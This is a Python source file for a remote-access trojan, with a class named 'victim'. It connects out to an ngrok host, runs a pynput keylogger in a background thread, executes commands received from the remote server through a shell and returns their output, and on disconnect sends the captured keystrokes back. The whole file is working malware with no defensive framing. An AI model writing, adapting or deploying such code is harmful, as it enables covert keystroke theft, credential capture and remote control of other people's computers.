import socket as soket
import subprocess
import threading as thread
import time
import os
from pynput import keyboard


FORMAT = 'utf-8'
DISCONNECT_KEY = 'disconnect'
KEYS = []


def keylogg():
    print('Keylog started')

    def onpress(key):
        try:
            keypressed = 'KEY PRESSED: {0}'.format(key.char)
            KEYS.append(keypressed)
        except AttributeError:
            specialkey = 'SPEACIAL KEY PRESSED {0}'.format(key)
            KEYS.append(specialkey)

    def onrelease(key):
        relesedkey = '{0} realeased'.format(key)
        KEYS.append(relesedkey)

    with keyboard.Listener(on_press=onpress, on_release=onrelease) as listener:
        listener.join()


class victim:
    def __init__(self, serverip, serverport):
        self.serveradress = serverip
        self.serverportnumber = serverport
        self.client = soket.socket(soket.AF_INET, soket.SOCK_STREAM)

    def threda(self, func):
        thead1 = thread.Thread(target=func)
        thead1.start()

    def servercom(self):
        self.client.connect((self.serveradress, self.serverportnumber))
        self.threda(func=keylogg)
        while True:
            try:
                time.sleep(2)
                get_current_directory = os.getcwd().encode(FORMAT)
                self.client.send(get_current_directory)
                command_recved = self.client.recv(1048576).decode()
                print(command_recved)
                if command_recved.startswith('cd'):
                    try:
                        changedirec = os.chdir(os.path.join(get_current_directory, command_recved[3:]))
                        continue
                    except:
                        print('Enter a valid directory!!!')
                elif command_recved == DISCONNECT_KEY:
                    encodelist = str(KEYS).encode()
                    self.client.send(encodelist)
                    self.client.close()
                commandprocess = subprocess.check_output(command_recved, shell=True, text=True).encode(FORMAT)
                self.client.send(commandprocess)
            except:
                self.client.send('Error'.encode(FORMAT))
                continue


tt = victim('8.tcp.ngrok.io', 10882)

tt.servercom()
print(KEYS)
